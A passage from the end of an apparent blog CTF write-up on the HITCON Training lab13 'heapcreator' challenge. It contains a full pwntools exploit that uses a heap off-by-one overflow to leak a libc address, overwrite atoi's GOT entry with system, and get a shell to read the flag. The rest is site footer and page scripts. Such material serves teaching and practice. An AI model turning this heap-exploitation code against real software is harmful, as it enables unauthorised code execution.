+<pre tabindex="0"><code>edit(&#39;2&#39;, p64(system_addr))
+
+p.send(&#39;sh&#39;)
+
+p.interactive()
+</code></pre><p><img loading="lazy" src="/ctf/overlapping-HITCON_Training_lab13.assets/image-20231122171748809.png" alt="image-20231122171748809"  />
+</p>
+<pre tabindex="0"><code>#!/usr/bin/python3
+from pwn import *
+context.log_level = &#39;debug&#39;
+
+p = process(&#39;./heapcreator&#39;)
+
+def create(size, content):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;1&#39;)
+    p.recvuntil(&#39;Size of Heap : &#39;)
+    p.send(size)
+    p.recvuntil(&#39;Content of heap:&#39;)
+    p.send(content)
+
+def edit(index, content):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;Index :&#39;)
+    p.send(index)
+    p.recvuntil(&#39;Content of heap : &#39;)
+    p.send(content)
+    
+def show(index):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&#39;Index :&#39;)
+    p.send(index)
+
+def delete(index):
+    p.recvuntil(&#39;Your choice :&#39;)
+    p.sendline(&#39;4&#39;)
+    p.recvuntil(&#39;Index :&#39;)
+    p.send(index)
+
+
+create(&#39;24&#39;, &#39;a&#39;*24)
+create(&#39;16&#39;, &#39;b&#39;*16)
+create(&#39;16&#39;, &#39;c&#39;*16)
+
+
+overflow = b&#39;a&#39;*24 + b&#39;\x81&#39;
+edit(&#39;0&#39;, overflow)
+
+delete(&#39;0&#39;)
+delete(&#39;1&#39;)
+
+
+create(&#39;16&#39;, &#39;d&#39;*16)
+payload = b&#39;a&#39;*0x40 + p64(16) + p64(0x602060)
+create(&#39;112&#39;, payload)
+
+
+show(&#39;2&#39;)
+p.recvuntil(&#39;Content : &#39;)
+atoi = u64(p.recvuntil(&#39;Done !&#39;, drop=True)[:-1].ljust(8, b&#39;\x00&#39;))
+print(&#39;[+] atoi = &#39; + hex(atoi))
+
+atoi_libc = 0x36e90
+system = 0x453a0
+base = atoi - atoi_libc
+system_addr = base + system
+
+
+
+# gdb.attach(p, &#39;b*0x400B2B&#39;)
+# pause()
+
+edit(&#39;2&#39;, p64(system_addr))
+
+p.send(&#39;cat ./flag&#39;)
+
+p.interactive()
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/house_of_spirit/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>House_of_spirit</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/ret2csuinit_new/">
+    <span class="title">Next »</span>
+    <br>
+    <span>ret2csuinit_new</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
